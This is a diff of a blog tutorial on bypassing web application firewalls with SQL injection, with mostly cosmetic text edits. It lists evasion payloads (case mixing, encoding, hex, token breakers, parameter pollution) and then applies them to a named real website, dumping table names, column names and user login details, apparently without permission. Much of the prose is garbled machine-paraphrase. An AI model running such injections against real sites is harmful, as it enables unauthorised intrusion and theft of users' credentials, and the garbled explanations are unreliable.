@@ -65,15 +65,15 @@
       <h1 id="waf-bypass--sql-injection-part-2">WAF bypass | SQL Injection Part 2</h1>
 <p>In the previous article, we discussed simple SQL injection, so in this instructional exercise, I will attempt to speak more about the inward idea than simply bypassing it. When you know the idea, you can undoubtedly control things and foster your own detour strategies in a substantially more sensitive manner than merely being reliant upon that load of crappy stunts. Another thing as am not, even more, a hypothesis fellow so that I will examine the highlight point.</p>
 <h2 id="what-is-firewall">What is Firewall</h2>
-<p>A firewall is an organization security gadget that screens approaching and active organization traffic and allows or hinders information parcels dependent on many safety rules. Its motivation is to build a boundary between your inward organization and approaching traffic from external sources (like the web) to impede malignant traffic like hackers.</p>
+<p>A firewall is an organization security device that screens approaching and active organization traffic and allows or hinders information parcels dependent on many safety rules. Its motivation is to build a boundary between your inward organization and approaching traffic from external sources (like the web) to impede Malicious traffic like hackers.</p>
 <h2 id="how-does-a-firewall-work">How does a firewall work?</h2>
-<p>Firewalls cautiously dissect approaching traffic dependent on pre-setup rules and channel traffic from unstable or dubious sources to forestall assaults. Firewalls monitor traffic at a PC&rsquo;s entrance point, called ports, which is the place where data is traded with outer gadgets. For instance, &ldquo;Source address 172.18.1.1 is permitted to arrive at objective 172.18.2.1 over port 22.&rdquo;</p>
-<p>Consider IP addresses as houses and port numbers as rooms inside the house. Just confided in individuals (source addresses) are permitted to go into the house (objective location) by any stretch of the imagination. Then, at that point, it&rsquo;s further sifted so that individuals inside the house are permitted to get to specific rooms (objective ports) if they&rsquo;re the proprietor, a youngster, or a visitor. The proprietor is allowed to any room (any port), while kids and visitors are permitted into a specific arrangement of rooms (explicit ports).</p>
+<p>Firewalls cautiously dissect approaching traffic dependent on pre-setup rules and channel traffic from unstable or dubious sources to forestall attacks. Firewalls monitor traffic at a PC’s entrance point, called ports, which is the place where data is traded with outer device. For instance, “Source address 172.18.1.1 is permitted to arrive at objective 172.18.2.1 over port 22.”</p>
+<p>Consider IP addresses as houses and port numbers as rooms inside the house. Just confided in individuals (source addresses) are permitted to go into the house (objective location) by any stretch of the imagination. Then, at that point, it’s further sifted so that individuals inside the house are permitted to get to specific rooms (objective ports) if they’re the proprietor, a youngster, or a visitor. The proprietor is allowed to any room (any port), while kids and visitors are permitted into a specific arrangement of rooms (explicit ports).</p>
 <h2 id="common-type-of-firewalls">Common Type of Firewalls</h2>
 <h3 id="network-layer-firewall">Network Layer Firewall</h3>
-<p>Organization layer firewalls work at a generally low level of the TCP/IP convention stack, not permitting bundles to go through the firewall except if they match the setup rule set, which could be White Listing or the Black Listing. The firewall director might characterize the standards, or default rules might be applied. This sort of firewall generally drops the parcel when it doesn&rsquo;t pass the ruleset. Commonly while Injecting an application, when your package gets wholly dropped and shows that there was no answer from the server, you can expect that is it&rsquo;s a Network Firewall. Albeit the conduct can not be unmistakable, it relies typically upon the settings.</p>
+<p>Organization layer firewalls work at a generally low level of the TCP/IP convention stack, not permitting bundles to go through the firewall except if they match the setup rule set, which could be White Listing or the Black Listing. The firewall director might characterize the standards, or default rules might be applied. This sort of firewall generally drops the parcel when it doesn’t pass the ruleset. Commonly while Injecting an application, when your package gets wholly dropped and shows that there was no answer from the server, you can expect that is it’s a Network Firewall. Albeit the conduct can not be unmistakable, it relies typically upon the settings.</p>
 <h3 id="web-application-firewall">Web Application Firewall</h3>
-<p>WAFs are ordinarily sent in a type of intermediary design before web applications, so they don&rsquo;t see all traffic on our organizations. By observing the traffic before it arrives at the web application, WAFs can dissect demands before passing them on. This is the thing that gives them such a benefit over IPSs. Since IPSs are intended to grill all organization traffic, they can&rsquo;t investigate the application layer as thoroughly as WAF.</p>
+<p>WAFs are ordinarily sent in a type of intermediary design before web applications, so they don’t see all traffic on our organizations. By observing the traffic before it arrives at the web application, WAFs can dissect demands before passing them on. This is the thing that gives them such a benefit over IPSs. Since IPSs are intended to grill all organization traffic, they can’t investigate the application layer as thoroughly as WAF.</p>
 <h2 id="detecting-the-waf">Detecting the WAF</h2>
 <p>There are many devices and contents which can recognize and finger impression WAF presence over an Application, which incorporates however not restricted to</p>
 <ol>
@@ -115,8 +115,7 @@
 <p>RUN shodan.io or censys.io</p>
 </li>
 <li>
-<p>Search SPF records and TXT records.
-SPF and TXT records may have an IP address of a CloudFlare less beginning point.</p>
+<p>Search SPF records and TXT records. SPF and TXT records may have an IP address of a CloudFlare less beginning point.</p>
 </li>
 <li>
 <p>Likewise can check securitytrails.com in the field. Historical information may have unique IPs in old records.</p>
@@ -128,13 +127,13 @@ SPF and TXT records may have an IP address of a CloudFlare less beginning point.
 <p>WAFs utilize standard ports 80, 443, 8000, 8008, 8080, and 8088 ports.</p>
 </li>
 <li>
-<p>Send GET solicitations to arbitrary open ports and check standards that may uncover the WAFs character.</p>
+<p>Send GET request to arbitrary open ports and check standards that may uncover the WAFs character.</p>
 </li>
 <li>
-<p>Attempt some SQL injection payloads like: &quot; or 1 = 1 — to login frames or fail to remember a secret phrase.</p>
+<p>Attempt some SQL injection payloads like: &quot; or 1 = 1 — to login frames or fail to remember a password.</p>
 </li>
 <li>
-<p>Attempt with loud XSS payloads like <!-- raw HTML omitted -->confirm()<!-- raw HTML omitted --> in some info fields.</p>
+<p>Attempt with loud XSS payloads like confirm() in some info fields.</p>
 </li>
 <li>
 <p>Attempt to add ../../etc/passwd to an arbitrary boundary in the URL address.</p>
@@ -143,7 +142,7 @@ SPF and TXT records may have an IP address of a CloudFlare less beginning point.
 <p>Add a few payloads like ' OR SLEEP(5) OR ' toward the finish of URLs to any arbitrary boundary.</p>
 </li>
 <li>
-<p>Send GET demands with obsolete conventions like HTTP/0.9 (HTTP/0.9 doesn&rsquo;t uphold POST sort queries).</p>
+<p>Send GET demands with obsolete conventions like HTTP/0.9 (HTTP/0.9 doesn’t uphold POST sort queries).</p>
 </li>
 <li>
 <p>Actually, look at the server header upon various sorts of connections.</p>
@@ -160,8 +159,7 @@ SPF and TXT records may have an IP address of a CloudFlare less beginning point.
 <p>Consolidate upper and lower case characters for making effective payloads.</p>
 <ul>
 <li>
-<p>Fundamental Request:
-<code>SELECT * FROM * WHERE OWNER = 'hacksec_db'</code></p>
+<p>Fundamental Request: <code>SELECT * FROM * WHERE OWNER = 'hacksec_db'</code></p>
 </li>
 <li>
 <p>Bypassed Technique:</p>
@@ -169,8 +167,7 @@ SPF and TXT records may have an IP address of a CloudFlare less beginning point.
 </li>
 </ul>
 <h3 id="2-url-encoding-technique">2. URL Encoding Technique</h3>
-<p>Encode typical payloads with % encoding/URL encoding.
-You can utilize Burp. It has an encoder/decoder apparatus.</p>
+<p>Encode typical payloads with % encoding/URL encoding. You can utilize Burp. It has an encoder/decoder apparatus.</p>
 <ul>
 <li>
 <p>Blocked by WAF:</p>
@@ -190,7 +187,7 @@ You can utilize Burp. It has an encoder/decoder apparatus.</p>
 <ul>
 <li>
 <p>Blocked by WAF:</p>
-<p><code>https://hacksec.in/viewAllProducts.php?sc=1'UnION  Select 10-- -</code></p>
+<p><code>https://hacksec.in/viewAllProducts.php?sc=1'UnION Select 10-- -</code></p>
 </li>
 <li>
 <p>Bypassed Technique:</p>
@@ -198,7 +195,7 @@ You can utilize Burp. It has an encoder/decoder apparatus.</p>
 </li>
 <li>
 <p>Model in URL:</p>
-<p><code>http://www.hacksec.in/viewAllProducts.php?sc=1'UnION   Select 0x2e312929556e494f6e2053656c65637420312c322c332c342c352c362c372c382c392c3130-- --</code></p>
+<p><code>http://www.hacksec.in/viewAllProducts.php?sc=1'UnION Select 0x2e312929556e494f6e2053656c65637420312c322c332c342c352c362c372c382c392c3130-- --</code></p>
 </li>
 </ul>
 <h3 id="4-token-breakers-technique">4. Token Breakers Technique</h3>
@@ -217,7 +214,7 @@ You can utilize Burp. It has an encoder/decoder apparatus.</p>
 </li>
 </ul>
 <h3 id="5-http-parameter-pollution">5. HTTP Parameter Pollution</h3>
-<p>It might be large numbers of you have known about it; however, I am sure the couple would have utilized it at any point. Most importantly, HPP, Definition at OWASP - Supplying different HTTP boundaries with a similar name might make an application decipher values in unexpected ways. By taking advantage of these impacts, an assailant might have the option to sidestep input approval, trigger application mistakes or change inside factors esteems. As HTTP Parameter Pollution (in short HPP) influences a structure square of all web innovations, server and customer side assaults exist.</p>
+<p>It might be large numbers of you have known about it; however, I am sure the couple would have utilized it at any point. Most importantly, HPP, Definition at OWASP - Supplying different HTTP boundaries with a similar name might make an application decipher values in unexpected ways. By taking advantage of these impacts, an attacker might have the option to sidestep input approval, trigger application mistakes or change inside factors esteems. As HTTP Parameter Pollution (in short HPP) influences a structure square of all web innovations, server and customer side assaults exist.</p>
 <ul>
 <li>
 <p>Blocked by WAF:</p>
@@ -228,20 +225,19 @@ You can utilize Burp. It has an encoder/decoder apparatus.</p>
 <p><code>http://hacksec.in/product.aspx?uid='union--+&amp;uid=*/%0aselect 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,'web.config',20,21--</code></p>
 </li>
 </ul>
-<h2 id="lets-pick-some-live-example">let&rsquo;s pick some live example</h2>
+<h2 id="lets-pick-some-live-example">let’s pick some live example</h2>
 <ul>
-<li>Here is an example site <a href="https://www.aquacity.com.pk">https://www.aquacity.com.pk</a> which we are going to test.
-in the previous article, we have discussed how you can find a table and columns, etc., so in this article, I am skipping that part</li>
+<li>Here is an example site <a href="https://www.aquacity.com.pk">https://www.aquacity.com.pk</a> which we are going to test. in the previous article, we have discussed how you can find a table and columns, etc., so in this article, I am skipping that part</li>
 </ul>
 <p><img src="https://i.postimg.cc/gkQ9Jg8K/1-waff.png" alt="enter image description here"></p>
 <ul>
-<li>As you can see, WAF detects the usual payload, so let&rsquo;s try to bypass that shit.</li>
+<li>As you can see, WAF detects the usual payload, so let’s try to bypass that shit.</li>
 </ul>
 <p><img src="https://i.postimg.cc/0yXCx4S8/waff2222.png" alt="enter image description here"></p>
 <p>So here you can see that our new payload has bypassed the firewall.</p>
 <p><code>https://www.aquacity.com.pk/page.php?id=-1' /!50000union/ /!50000select/ 1,2,3--+-</code></p>
 <ul>
-<li>Now it&rsquo;s time to dump the table.</li>
+<li>Now it’s time to dump the table.</li>
 </ul>
 <p><img src="https://i.postimg.cc/P5DmsqdM/3-wafffff.png" alt="enter image description here"></p>
 <p><code>https://www.aquacity.com.pk/page.php?id=-1' /!50000union/ select 1,group_concat(table_name,0x3c62723e),3 /!50000from/ /!50000information_schema.tables/ where table_schema=database()--+-</code></p>
@@ -251,11 +247,10 @@ in the previous article, we have discussed how you can find a table and columns,
 <p><img src="https://i.postimg.cc/nh6fr3bJ/4-wafffffffffffffff.png" alt="enter image description here"></p>
 <p><code>https://www.aquacity.com.pk/page.php?id=-1' /!50000union/ /!50000select/ 1,group_concat(column_name,0x3c62723e),3 /!50000from/ /!50000information_schema.columns/ /!50000where/ /!50000table_name/=CHAR(108, 111, 103, 105, 110)--+-</code></p>
 <ul>
-<li>Now it&rsquo;s the final thing to do is dump login data</li>
+<li>Now it’s the final thing to do is dump login data</li>
 </ul>
-<p><img src="https://i.postimg.cc/85ZyJCJ6/5waffffffffffffff.png" alt="enter image description here">
-as you see, we fetch user login details of the site by bypassing the firewall.</p>
-<p>As I cannot talk about every one of the subjects in a single instructional exercise, we will stop here for this part. We Will begin with different subjects on WAF in the following detail; till then have fun&hellip;keep learning :)</p>
+<p><img src="https://i.postimg.cc/85ZyJCJ6/5waffffffffffffff.png" alt="enter image description here"> as you see, we fetch user login details of the site by bypassing the firewall.</p>
+<p>As I cannot talk about every one of the subjects in a single instructional exercise, we will stop here for this part. We Will begin with different subjects on WAF in the following detail; till then have fun…keep learning :)</p>
 <h3 id="thanks-for-reading">Thanks for reading</h3>
 
     </div>
